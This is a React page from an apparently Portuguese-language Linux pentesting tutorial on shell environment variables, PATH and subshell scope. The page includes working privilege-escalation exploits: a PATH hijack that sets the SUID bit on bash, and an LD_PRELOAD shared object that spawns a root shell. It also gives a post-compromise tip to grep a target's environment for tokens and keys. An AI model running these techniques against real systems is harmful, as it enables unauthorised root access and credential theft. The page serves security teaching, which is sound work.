import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function VariaveisAmbiente() {
  return (
    <PageContainer
      title="Variáveis de ambiente"
      subtitle="export, env, PATH, escopo de subshell e como manipular tudo isso para PrivEsc via PATH hijacking."
      difficulty="iniciante"
      timeToRead="13 min"
    >
      <h2>Shell vs ambiente</h2>
      <p>
        Toda variável criada num shell é local àquele processo. Quando o shell <em>spawna</em>
        um filho (por exemplo ao rodar um comando), só as variáveis marcadas como <strong>
        exportadas</strong> são herdadas. Esse é o conceito chave.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "FOO=bar",
            out: "(silencioso — variável local)",
            outType: "muted",
          },
          {
            cmd: "echo $FOO",
            out: "bar",
            outType: "info",
          },
          {
            comment: "subshell NÃO herda",
            cmd: "bash -c 'echo $FOO'",
            out: "(linha vazia)",
            outType: "warning",
          },
          {
            cmd: "export FOO",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "bash -c 'echo $FOO'",
            out: "bar",
            outType: "success",
          },
          {
            comment: "atalho: definir já exportando",
            cmd: "export BAR=baz",
            out: "(silencioso)",
            outType: "muted",
          },
        ]}
      />

      <h2>env, set, printenv, declare</h2>
      <CommandTable
        title="ferramentas para inspecionar"
        variations={[
          { cmd: "env", desc: "Variáveis exportadas no shell atual.", output: "PATH=...\nHOME=/home/wallyson\nSHELL=/usr/bin/zsh\nUSER=wallyson" },
          { cmd: "printenv PATH", desc: "Imprime UMA variável (igual env | grep, mas mais limpo).", output: "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" },
          { cmd: "set", desc: "TUDO: vars exportadas + locais + funções shell.", output: "Saída longa — combine com less ou grep." },
          { cmd: "set | head", desc: "Só as primeiras (alfabético).", output: "BASH=/usr/bin/bash\nBASHOPTS=...\nBASH_ALIASES=()..." },
          { cmd: "declare -p FOO", desc: "Mostra como FOO está declarada (atributos).", output: "declare -- FOO=\"bar\"        ↳ -- = simples\ndeclare -x FOO=\"bar\"        ↳ -x = exportada\ndeclare -i FOO=\"42\"         ↳ -i = inteiro" },
          { cmd: "declare -x", desc: "Lista TODAS as exportadas (= export sem args).", output: "declare -x HOME=\"/home/wallyson\"\ndeclare -x PATH=\"/usr/local/sbin:...\"" },
          { cmd: "unset FOO", desc: "Remove a variável (local OU exportada).", output: "echo $FOO depois retorna vazio." },
          { cmd: "env -i bash", desc: "Inicia bash COM AMBIENTE LIMPO (zero variáveis herdadas).", output: "Reproduz comportamento mínimo (cron, systemd)." },
          { cmd: "env FOO=hack ./script.sh", desc: "Define vars SÓ para esse comando.", output: "FOO existe dentro do script, some depois." },
        ]}
      />

      <h2>Variáveis built-in que você precisa conhecer</h2>
      <CodeBlock
        language="bash"
        title="as essenciais"
        code={`HOME       # /home/wallyson  -- diretório do usuário
USER       # wallyson        -- nome do usuário corrente
LOGNAME    # wallyson        -- igual USER, vem do login
SHELL      # /usr/bin/zsh    -- shell padrão (NÃO o atual)
PWD        # /tmp/loot       -- diretório atual
OLDPWD     # /home/wallyson  -- diretório anterior (cd - usa)
PATH       # onde o shell procura executáveis
LD_LIBRARY_PATH  # onde o ld procura .so adicionais (PrivEsc!)
LD_PRELOAD       # força carregar .so antes de qualquer outra (PrivEsc!)
LANG/LC_ALL  # idioma e encoding
TERM       # xterm-256color  -- tipo do terminal (afeta cores, vim)
HOSTNAME   # kali
EDITOR     # /usr/bin/vim    -- editor padrão de git, sudoedit, etc.
PAGER      # less
HISTFILE   # ~/.bash_history -- arquivo do history
HISTSIZE   # quantas entradas em memória
PS1        # string do prompt principal
PS2        # prompt secundário (continuação de linha: > )
IFS        # Internal Field Separator (whitespace por padrão)
RANDOM     # número aleatório novo a cada leitura
$$         # PID do shell atual
$?         # código de saída do último comando (0 = sucesso)
$!         # PID do último processo em background
$_         # último argumento do último comando`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "echo \"PID=$$  USER=$USER  PWD=$PWD\"",
            out: "PID=8421  USER=wallyson  PWD=/home/wallyson",
            outType: "info",
          },
          {
            cmd: "ls /naoexiste; echo $?",
            out: `ls: não foi possível acessar '/naoexiste': Não existe arquivo ou diretório
2`,
            outType: "warning",
          },
          {
            cmd: "true; echo $?",
            out: "0",
            outType: "success",
          },
          {
            cmd: "echo $RANDOM $RANDOM $RANDOM",
            out: "29183 4072 21988",
            outType: "default",
          },
        ]}
      />

      <h2>PATH — o calcanhar de Aquiles</h2>
      <p>
        <code>PATH</code> é uma lista de diretórios separada por <code>:</code> onde o shell
        procura executáveis quando você digita um comando sem caminho completo. Quem
        controla o conteúdo desses diretórios — ou pior, consegue colocar um diretório
        próprio na frente — controla o que vai rodar. Esse é o ataque clássico de
        <strong> PATH hijacking</strong>.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "echo $PATH | tr ':' '\\n'",
            out: `/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
/sbin
/bin
/home/wallyson/.local/bin`,
            outType: "info",
          },
          {
            comment: "qual binário o shell ESTÁ usando",
            cmd: "type -a ls",
            out: `ls é um alias para 'ls --color=tty'
ls é /usr/bin/ls
ls é /bin/ls`,
            outType: "muted",
          },
          {
            comment: "adicionar diretório AO FINAL (mais seguro)",
            cmd: "export PATH=\"$PATH:$HOME/tools/bin\"",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "adicionar AO INÍCIO (precedência sobre o sistema — perigoso!)",
            cmd: "export PATH=\"$HOME/.minhas/bin:$PATH\"",
            out: "(qualquer 'ls' ali sobrescreve o /usr/bin/ls)",
            outType: "warning",
          },
        ]}
      />

      <h2>PATH hijacking para PrivEsc</h2>
      <p>
        Cenário típico: um <strong>SUID binary</strong> ou um <strong>sudo NOPASSWD</strong>
        executa um comando sem caminho absoluto (ex: chama <code>tar</code> em vez de
        <code> /usr/bin/tar</code>). Se você consegue manipular o PATH do alvo, coloca um
        falso <code>tar</code> no início e ele roda como root.
      </p>

      <CodeBlock
        language="bash"
        title="exploit clássico de PATH hijack"
        code={`# Cenário: /usr/local/bin/backup.sh é SUID root e contém:
#   #!/bin/bash
#   tar czf /backup/data.tar.gz /var/data
#   ↑ chama 'tar' relativo, sem /usr/bin/tar

# 1. Cria um 'tar' malicioso no /tmp
cat > /tmp/tar <<'EOF'
#!/bin/bash
chmod u+s /bin/bash    # marca o bash como SUID root
EOF
chmod +x /tmp/tar

# 2. Coloca /tmp na FRENTE do PATH
export PATH=/tmp:$PATH

# 3. Roda o script SUID
/usr/local/bin/backup.sh

# 4. Bash agora é SUID root
/bin/bash -p
# id  →  uid=1000(low) gid=1000(low) euid=0(root) groups=...`}
      />

      <h2>LD_PRELOAD e LD_LIBRARY_PATH</h2>
      <p>
        Outras duas variáveis perigosas. <code>LD_PRELOAD</code> força o linker a carregar
        um <em>.so</em> de sua escolha ANTES de qualquer outra biblioteca, permitindo
        sobrescrever funções da libc. Por segurança, programas SUID ignoram essas vars —
        mas se sudoers tem <code>env_keep+=LD_PRELOAD</code> a defesa cai e vira PrivEsc
        trivial.
      </p>

      <CodeBlock
        language="bash"
        title="exploit LD_PRELOAD via sudo mal configurado"
        code={`# Em /etc/sudoers existe:   Defaults env_keep += "LD_PRELOAD"
# E o user pode rodar: sudo -u root /usr/bin/qualquer_coisa

# 1. payload em C
cat > /tmp/x.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}
EOF

# 2. compila como shared object
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c

# 3. dispara
sudo LD_PRELOAD=/tmp/x.so apache2
# → cai em shell root`}
      />

      <h2>Escopo, subshells e exportação implícita</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "X=10",
            out: "(local)",
            outType: "muted",
          },
          {
            comment: "( ) cria subshell — alterações lá não afetam aqui",
            cmd: "(X=99; echo \"dentro: $X\"); echo \"fora: $X\"",
            out: `dentro: 99
fora: 10`,
            outType: "info",
          },
          {
            comment: "{ } NÃO cria subshell — é o mesmo shell",
            cmd: "{ X=99; echo \"dentro: $X\"; }; echo \"fora: $X\"",
            out: `dentro: 99
fora: 99`,
            outType: "warning",
          },
          {
            comment: "pipe cria subshell pra cada lado — pegadinha clássica",
            cmd: "echo a | read X; echo \"X=[$X]\"",
            out: "X=[]",
            outType: "error",
          },
        ]}
      />

      <h2>Persistir variáveis</h2>
      <CodeBlock
        language="bash"
        title="onde colocar export FOO=bar"
        code={`# 1. Para SEU usuário, em todos os shells de login:
#    ~/.bash_profile  (ou ~/.profile)
#
# 2. Para SEU usuário, em todo terminal interativo (não-login):
#    ~/.bashrc
#    ~/.zshrc  (se usa zsh)
#
# 3. Para TODOS os usuários, modo correto (Debian/Kali):
#    /etc/environment      ← KEY=VALUE puro, sem 'export'
#    /etc/profile.d/*.sh   ← scripts shell tradicionais (com export)
#
# 4. Para um serviço systemd:
#    [Service]
#    Environment="FOO=bar"
#    EnvironmentFile=/etc/default/meu-servico`}
      />

      <PracticeBox
        title="Reproduza um PATH hijack em laboratório"
        goal="Demonstrar como uma variável de ambiente pode mudar qual binário é executado."
        steps={[
          "Crie um diretório /tmp/fake e coloque ali um script chamado 'ls' que apenas escreve 'PWND'.",
          "Marque-o como executável.",
          "Adicione /tmp/fake ao início do PATH.",
          "Rode 'ls' — deve aparecer PWND em vez do listing.",
          "Restaure: export PATH para o original.",
        ]}
        command={`mkdir -p /tmp/fake
cat > /tmp/fake/ls <<'EOF'
#!/bin/bash
echo "PWND — você executou meu fake ls"
EOF
chmod +x /tmp/fake/ls
export PATH=/tmp/fake:$PATH
ls
type -a ls`}
        expected={`PWND — você executou meu fake ls
ls é hashed (/tmp/fake/ls)
ls é um alias para 'ls --color=tty'
ls é /tmp/fake/ls
ls é /usr/bin/ls
ls é /bin/ls`}
        verify="O comando 'type -a ls' lista /tmp/fake/ls antes do /usr/bin/ls — provando que o shell encontra ele primeiro."
      />

      <AlertBox type="danger" title="Auditoria pós-pwn: leia o env do alvo">
        Após cair num shell, sempre rode <code>env</code> e <code>set | grep -i</code>
        <code> 'pass\\|secret\\|token\\|key'</code>. Variáveis de ambiente são um esconderijo
        favorito de credenciais (ex: <code>AWS_SECRET_ACCESS_KEY</code>,
        <code> DATABASE_URL</code>, <code>GITHUB_TOKEN</code>) — especialmente em containers
        e CI/CD.
      </AlertBox>
    </PageContainer>
  );
}
